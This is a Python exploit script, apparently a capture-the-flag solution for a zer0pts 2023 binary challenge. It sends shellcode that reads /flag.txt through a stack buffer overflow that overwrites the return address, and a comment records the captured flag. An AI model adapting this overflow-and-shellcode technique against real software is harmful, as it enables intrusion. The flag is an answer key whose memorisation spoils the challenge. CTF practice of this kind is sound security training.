#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './bin/vuln'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local  = {'host':'localhost', 'port':9005}, \
                        remote = {'host':'pwn.2023.zer0pts.com', 'port':9005})
env.select()

#==========

binf = ELF(bin_file)
addr_main           = 0x7fffb7dd71a9
binf.address        = addr_main - binf.sep_function['main']

libc = ELF('./lib/libc.so.6')
addr_libc_start_main = 0x7fffb7dff083 - 0xf3
libc.address         = addr_libc_start_main - libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    addr_stack = 0x80000000dc40

    shellasm  = shellcraft.cat('/flag.txt')
    shellasm += shellcraft.exit(0)

    exploit  = asm(shellasm)
    exploit  = exploit.ljust(0x108, b'\x00')
    exploit += flat(0x6161616161616100, 0xdeadbeef, addr_stack)
    conn.sendlineafter(b'Enter something\n', exploit[:-1])

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{Th1s_j4Il_f33Ls_m0R3_c0mF0rt4bL3_tH4n_r34L_3nv1r0nm3nt}

if __name__=='__main__':
    main()

#==========
